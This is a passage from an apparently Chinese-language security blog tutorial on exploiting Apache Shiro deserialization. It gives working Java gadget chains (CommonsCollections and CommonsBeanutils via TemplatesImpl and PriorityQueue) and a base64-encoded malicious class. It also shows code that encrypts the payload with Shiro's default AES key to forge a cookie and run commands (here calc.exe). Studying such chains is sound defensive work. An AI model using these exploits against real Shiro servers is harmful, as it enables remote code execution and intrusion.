&quot;HelloTemplatesImpl&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            //Faketransform  </span><br><span class="line">            Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);  </span><br><span class="line">            //LazyMap.class  </span><br><span class="line">            Map innerMap = new HashMap();  </span><br><span class="line">            Map outerMap = LazyMap.decorate(innerMap, transformer);  </span><br><span class="line">            //TiedMapEntry.class  </span><br><span class="line">            TiedMapEntry tme = new TiedMapEntry(outerMap, obj);  </span><br><span class="line">            //HashMap.class  </span><br><span class="line">            Map expMap = new HashMap();  </span><br><span class="line">            expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">            outerMap.clear();  </span><br><span class="line">            //将假的transform 中的  method 改成 newTransformer            setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);  </span><br><span class="line">  </span><br><span class="line">            // ==================  </span><br><span class="line">            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(expMap);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>写个Client 类配合 CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import javassist.ClassPool;  </span><br><span class="line">import javassist.CtClass;  </span><br><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();  </span><br><span class="line">  </span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>evil.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line">public class Evil extends AbstractTranslet &#123;  </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public Evil() throws Exception &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        System.out.println(&quot;Hello TemplatesImpl&quot;);  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把cookie传入shiro客户端 成功弹出计算器：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/99.jpg"></p><h1 id="CommonsBeanutils-无依赖攻击"><a href="#CommonsBeanutils-无依赖攻击" class="headerlink" title="CommonsBeanutils(无依赖攻击)"></a>CommonsBeanutils(无依赖攻击)</h1><p>之前我们都是打了  CC依赖来进行攻击的，如CC3.2.1 ，那么原生的Shiro是没有CC依赖的，接下来了解一下 CB （Apache Commons Beanutils）</p><h2 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，他提供了 对普通类对象 （JAVABean）的一些操作方法，至于什么是JAVABEAN，以我的理解，拥有GET  SET方法的类，可以笼称 为JAVABEAN</p><p>如，Cat是一个最简单的 JavaBean:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">final public class Cat &#123; </span><br><span class="line">private String name = &quot;Ku1s&quot;; </span><br><span class="line">public String getName() &#123; </span><br><span class="line">return name; &#125; </span><br><span class="line"></span><br><span class="line">public void setName(String name) &#123; </span><br><span class="line">this.name = name;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p>它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter 的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。</p><p>CB中 提供了一个静态方法： PropertyUtils.getProperty ，打印让我们看看什么情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;  </span><br><span class="line">        Object name = PropertyUtils.getProperty(new Cat(), &quot;name&quot;);  </span><br><span class="line">        System.out.println(name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看来这个 getProperty 会调用我们的 getter方法，也就是getName，获得返回值，除此之外，PropertyUtils.getProperty 还支持 递归获取属性，比如 a对象中有属性b，b对象有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter的利用"><a href="#getter的利用" class="headerlink" title="getter的利用"></a>getter的利用</h2><p>在 commons-beanutils包中存 在一个：<code> org.apache.commons.beanutils.BeanComparator 。</code></p><p>BeanComparator是CB提供用来比较两个 JAVAbean 是否相等的类，其实现了Comparator 和Serializable接口 ，咱们来看看他的compare比较方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public int compare(T o1, T o2) &#123;  </span><br><span class="line">    if (this.property == null) &#123;  </span><br><span class="line">        return this.internalCompare(o1, o2);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, this.property);  </span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, this.property);  </span><br><span class="line">            return this.internalCompare(value1, value2);  </span><br><span class="line">        &#125; catch (IllegalAccessException var5) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());  </span><br><span class="line">        &#125; catch (InvocationTargetException var6) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());  </span><br><span class="line">        &#125; catch (NoSuchMethodException var7) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>compare方法 接收两个对象：</p><ol><li>如果 这里的 property 为空，则直接比较这两个对象</li><li>如果这里的property 不为空，则调用PropertyUtils.getProperty，分别取这两个对象的 property属性，然后再比较他们的属性值。</li></ol><p>我们知道，PropertyUtils.getProperty 这个方法会自动调用 Getter 方法，这个点是任意代码执行的关键，有没有什么方法可以执行恶意代码执行呢？ 其实是有的</p><p>在第一篇  <a href="https://snowlyzz.github.io/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">JAVA动态加载字节码 | Ku1s (snowlyzz.github.io)</a>, 其中在跟源码的时候，有这么一条链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>看到 第一个 getOutputProperties，我们是否可以利用 Getter 自动去调用其 getOutputProperties()方法呢？然后后续再进行恶意字节码。</p><p>所以  PropertyUtils.getProperty( obj1, property ) 这段代码 ，obj1 是一个 TemplatesImpl 对象，而 property 的值为 outputProperties时，则会自动调用 getter 方法，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。</p><h2 id="getter反序列化利用连构造"><a href="#getter反序列化利用连构造" class="headerlink" title="getter反序列化利用连构造"></a>getter反序列化利用连构造</h2><p>了解了大概原理，接下来来构造一下 利用链</p><p>还是先构造 TemplatesImpl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后 到我们的 BeanComparator.class  ,进行实例化。如果我们默认 BeanComparator.class 构造函数为空时，默认的 property 就为空 :</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/null.jpg"></p><p><code>final BeanComparator comparator = new BeanComparator();</code></p><p>然后用这个 comparator实例化优先队列 PriorityQueue ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">final PriorityQueue queue = new PriorityQueue(2, comparator); </span><br><span class="line">// stub data for replacement later </span><br><span class="line">queue.add(1);</span><br><span class="line">queue.add(1);</span><br><span class="line"></span><br><span class="line">// comparator = BeanComparator对象</span><br></pre></td></tr></table></figure><p>至于为什么要 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时为了进行 内部的堆需要调整，进行元素的比较的话，肯定得至少两个元素才可以。这一点也在反序列化链的代码中得到了体现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们 再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个1替换成恶意的 TemplateImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); </span><br><span class="line">setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new PriorityQueue(2,comparator=BeanComparator对象)</span><br><span class="line">PriorityQueue#readObject() =&gt;</span><br><span class="line">heapify() =&gt;</span><br><span class="line">siftDown() = &gt;</span><br><span class="line">siftDownUsingComparator()=&gt;</span><br><span class="line">comparator.compare()</span><br><span class="line"></span><br><span class="line">BeanComparator#compare() =&gt;</span><br><span class="line">if (this.property == null) &#123;&#125;=&gt;</span><br><span class="line"></span><br><span class="line">Object value1 = PropertyUtils.getProperty(o1, this.property);</span><br><span class="line">Object value2 = PropertyUtils.getProperty(o2, this.property);</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getOutputProperties()=&gt;</span><br><span class="line">/**/</span><br><span class="line">TemplatesImpl#defineClass()</span><br></pre></td></tr></table></figure><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        BeanComparator comparator = new BeanComparator();//使 property =null 避免出错  </span><br><span class="line">  </span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        //将没改的值 改成恶意值  </span><br><span class="line">        setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //改成outputProperties,使自动调用getOutputProperties  </span><br><span class="line">        setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //让其去对比，且满足 queue[right]) &gt; 0  </span><br><span class="line">        byte[] serialize = serialize(priorityQueue);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oout = new ObjectOutputStream(baout))&#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器~~~<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/pc1.jpg"></p><h2 id="无依赖的Shiro反序列化利用"><a href="#无依赖的Shiro反序列化利用" class="headerlink" title="无依赖的Shiro反序列化利用"></a>无依赖的Shiro反序列化利用</h2><p>我们用上一个poc 发送payload 时会发现<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ud.jpg"></p><p><code>Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]</code></p><p>简单来说就是没有找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于commons-collections。</p><p>在实际场景下，目标可能没有安装 commons-collections依赖，那么这个时候，ComparableComparator这个类是用不了的，因为他依赖于CC，也就是我们刚刚用的那个POC，那么难道没有CC就不能利用吗？</p><p>我们先来看看这个 org.apache.commons.collections.comparators.ComparableComparator 这个类在 哪里使用了：</p><p>有两处 调用了  ComparableComparator ：</p><ol><li><p>ReverseComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/rev.jpg"></p></li><li><p>BeanComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/bc.jpg"></p></li></ol><p>这里 两者利用点都是类似的，所以只讲 BeanComparator 。</p><p>在BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator 。</p><p>既然此时 ComparableComparator 依赖于CC，并且我们用不了了,我们需要找到一个类来平替掉ComparableComparator，它满足下面这几个条件：</p><ol><li>实现 java.util.Comparator 接口 </li><li>实现 java.io.Serializable 接口 </li><li>Java、shiro或commons-beanutils自带，且兼容性强</li></ol><p>通过IDEA的功能，我们找到一个 CaseInsensitiveComparator ：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ks.png"></p><p>其代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static final Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER  </span><br><span class="line">                                     = new CaseInsensitiveComparator();  </span><br><span class="line">private static class CaseInsensitiveComparator  </span><br><span class="line">        implements Comparator&lt;String&gt;, java.io.Serializable &#123;  </span><br><span class="line">    // use serialVersionUID from JDK 1.2.2 for interoperability  </span><br><span class="line">    private static final long serialVersionUID = 8575799808933029326L;  </span><br><span class="line">  </span><br><span class="line">    public int compare(String s1, String s2) &#123;  </span><br><span class="line">        int n1 = s1.length();  </span><br><span class="line">        int n2 = s2.length();  </span><br><span class="line">        int min = Math.min(n1, n2);  </span><br><span class="line">        for (int i = 0; i &lt; min; i++) &#123;  </span><br><span class="line">            char c1 = s1.charAt(i);  </span><br><span class="line">            char c2 = s2.charAt(i);  </span><br><span class="line">            if (c1 != c2) &#123;  </span><br><span class="line">                c1 = Character.toUpperCase(c1);  </span><br><span class="line">                c2 = Character.toUpperCase(c2);  </span><br><span class="line">                if (c1 != c2) &#123;  </span><br><span class="line">                    c1 = Character.toLowerCase(c1);  </span><br><span class="line">                    c2 = Character.toLowerCase(c2);  </span><br><span class="line">                    if (c1 != c2) &#123;  </span><br><span class="line">                        // No overflow because of numeric promotion  </span><br><span class="line">                        return c1 - c2;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return n1 - n2;  </span><br><span class="line">    &#125;</span><br><span class="line">    private Object readResolve() &#123; return CASE_INSENSITIVE_ORDER; &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类是 java.lang.String 类下的私有类，实现了 Comparator 和 Serializable，是个好的替代品<br>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：</p><p>构造链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);//使 property =null 避免出错  </span><br><span class="line">  </span><br><span class="line">            final PriorityQueue&lt;Object&gt; priorityQueue = new 